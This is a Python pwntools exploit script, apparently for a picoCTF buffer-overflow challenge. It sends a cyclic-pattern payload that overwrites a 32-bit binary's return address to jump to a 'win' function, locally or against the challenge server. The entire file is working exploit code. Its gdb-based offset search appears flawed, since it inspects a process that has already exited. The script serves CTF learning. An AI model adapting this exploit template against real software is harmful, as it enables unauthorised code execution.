#!/usr/bin/python3

from pwn import *

# Set up context (architecture, logging level, etc.)
context.arch = 'i386'  # Set architecture to 32-bit
context.log_level = 'debug'  # Enable debug output for better visibility

# Load the binary
elf = ELF('./vuln')

# Automatically find a 'ret' gadget (if needed)
rop = ROP(elf)
ret_address = rop.find_gadget(['ret'])[0]  # Automatically finds the address of a 'ret' instruction

# Start a process or connect to the remote server
if args.REMOTE:
    io = remote('saturn.picoctf.net', 54740)
else:
    io = process('./vuln')

# Automatically find the offset using pwnlib.gdb
def find_offset():
    # Attach gdb to the process
    with context.quiet:
        io = process('./vuln')
        io.sendline(cyclic(100))  # Send a cyclic pattern
        io.wait_for_close()  # Wait for the program to crash

        # Use gdb to extract the crash address
        gdb_cmd = f"gdb ./vuln -q -ex 'set pagination off' -ex 'x/xw $eip' -ex 'quit'"
        gdb_output = subprocess.check_output(gdb_cmd, shell=True, stderr=subprocess.STDOUT)

        # Extract the crash address from gdb output
        crash_address = int(gdb_output.split(b':')[1].strip(), 16)
        offset = cyclic_find(crash_address)  # Find the offset of the crash value in the cyclic pattern

        log.info(f"Offset found: {offset}")
        return offset

# Find the offset
offset = find_offset()

# Reconnect to the remote server or restart the process
if args.REMOTE:
    io = remote('saturn.picoctf.net', 54740)
else:
    io = process('./vuln')

# Construct the payload
payload = cyclic(offset)  # Fill the buffer up to the return address
payload += p32(ret_address)  # Add the 'ret' gadget address (if needed)
payload += p32(elf.sym.win)  # Overwrite the return address with the address of `win`

# Send the payload
io.sendline(payload)

# Switch to interactive mode
io.interactive()
